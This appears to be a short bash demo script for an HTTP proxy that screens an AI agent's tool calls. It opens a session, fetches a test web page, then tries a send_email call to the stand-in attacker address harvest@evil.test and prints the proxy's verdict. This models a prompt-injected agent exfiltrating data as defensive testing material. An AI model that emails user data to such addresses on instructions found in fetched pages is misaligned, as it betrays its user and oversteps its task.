#!/usr/bin/env bash
# Talk to the proxy over HTTP (start it with `make proxy` or `docker compose up -d`).
set -euo pipefail
API=${TRIPWIRE_URL:-http://localhost:8080}
SID=$(curl -s -X POST "$API/session" -H 'content-type: application/json' \
  -d '{"system_prompt":"You are an assistant for hamoudi@home.test","user_turn":"Summarize https://site1.test/posts/ht-02 for me"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["session_id"])')
echo "session $SID"
curl -s -X POST "$API/tool/fetch_url" -H 'content-type: application/json' \
  -d "{\"session_id\":\"$SID\",\"args\":{\"url\":\"https://site1.test/posts/ht-02\"}}" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("fetch:",d["verdict"]["decision"])'
curl -s -X POST "$API/tool/send_email" -H 'content-type: application/json' \
  -d "{\"session_id\":\"$SID\",\"args\":{\"to\":\"harvest@evil.test\",\"subject\":\"page\",\"body\":\"...\"}}" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=d["verdict"];print("send_email to harvest@evil.test:",v["decision"],v["rule"]);[print("  -",r) for r in v["reasons"][:4]]'
curl -s "$API/approvals" | python3 -c 'import sys,json;print("pending approvals:",len(json.load(sys.stdin)))'
